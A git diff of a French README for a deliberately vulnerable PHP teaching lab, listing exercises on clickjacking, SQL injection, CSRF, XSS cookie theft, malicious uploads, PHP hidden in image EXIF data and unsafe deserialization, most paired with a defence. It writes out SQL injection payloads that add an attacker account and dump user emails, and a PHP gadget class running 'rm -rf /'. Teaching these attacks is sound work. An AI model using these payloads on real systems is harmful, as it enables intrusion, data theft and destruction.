@@ -2,10 +2,96 @@ les fichiers de ce répertoire nous permettent d'étudier le clickjacking via un
 Mais aussi pour ajouter des articles en superposant des iframes
 mais sur Chrome, depuis 2024 il n'est plus possible de mettre en place des cookies cross domain (appelé cookie tiers)
 Sur Edge cela marche toujours.
+
+
+1/Injection SQL : 
+avec le site simplePHPSite
+lors du login, la section injection SQL facile
+    // injection facile  ffqsffds' OR 1=1;--
+
+Ensuite lors du update mot de passe: en modifiant l'input hidden avec une requete sql on peut créer un utilisateur
+
+INSERT INTO utilisateurs (email)
+SELECT GROUP_CONCAT(email SEPARATOR ', ') AS emails FROM utilisateurs;
+
+
+INSERT INTO utilisateurs (email,password,prenom)
+SELECT 'hacker@gmail.com','123',GROUP_CONCAT(email SEPARATOR ', ') AS emails FROM utilisateurs;
+
+huynh@gmail.com';INSERT INTO utilisateurs (email,password,prenom)
+SELECT 'hacker@gmail.com','$2y$10$eIXeF1dcRUmQ2XbW2W7PZOZDsJ/4wMOiZcodSwYRdkdlA6uItBNDq',GROUP_CONCAT(email SEPARATOR ', ') AS emails FROM utilisateurs;
+
+page profil.php
+On peut injecter une requêts pour avoir plus d'utilisateur avec LIMIT 1,2
+
+Essayer d'utiliser les injection pour SHOW TABLES
+
+FIN Injection SQL
+
+
 Il y a aussi l'update email.
-
-Update email hack :
+2/Session hijacking Update email hack :
 fichiers : 
-victime : update_email.php
-attaquant : attaque.php
 
+victime : update_email.php
+attaquant : attaque.php (il faut 2 vhosts, un pour victie et un pour attaquant, un SSL aussi)
+ça va soumettre au site de la victime via un formulaire, en javascript, et on arrive au site de la victime.
+REMEDE : comment empêcher ça? CSRF
+Fin update email hack
+
+
+3/Attaque XSS dans le fichier message  avec simplePHPSite
+demander de créer un fichier php message avec un formulaire
+ensuite faire desinjections SQL
+
+ce cas d'étude est pour le vol de cookie 
+construire le formulaire de soumission de message dans message.php
+
+REMEDE : comment empêcher l'insertion de XSS? htmlspeicalchars
+
+
+5/Upload de scripts
+dans victime/vulnerabilites/upload.php
+uploader le fichier maiciousupload.php
+ensuite l'exécuter
+
+REMEDE : comment détecter du code PHP uploadé? ou empêcher?
+
+6/le fichier bitcoin-chocolat.jpg a dans son EXIF un code php
+inclure l'image comme un fichier php  peut exécuter le code
+utiliser le programme Exifer pour insérer du code php dans une image
+REMEDE : comment emmpêcher ça?
+
+7/clickjacking   (Sur EDGE)  CSRF
+victime : real_commerce.php et paiement_commerce.php
+attaquant : fake_commerce.php et fake_commerce_add_product.php
+
+REMEDE : X-Frame-Options
+
+
+8/attaque par unserialized object
+victime : unserialize.php   montre comment on serialise un objet anodin
+
+demander de faire la même chose avec un objet Evil
+
+// Le code malveillant
+class Evil {
+    public $cmd;
+
+    public function __construct($cmd) {
+        $this->cmd = $cmd;
+    }
+
+    public function __destruct() {
+        // Exemple d'exécution de commande système malveillante
+        exec($this->cmd);
+    }
+}
+
+// Sérialisation de l'objet malveillant
+$evil_object = new Evil('rm -rf /'); // Commande destructrice
+$serialized_evil_object = serialize($evil_object);
+
+$user = unserialize($_SESSION['user'], ["allowed_classes" => ["User"]]);
+$user = json_decode($_SESSION['user'], true);
+desactiver shell_exec etc
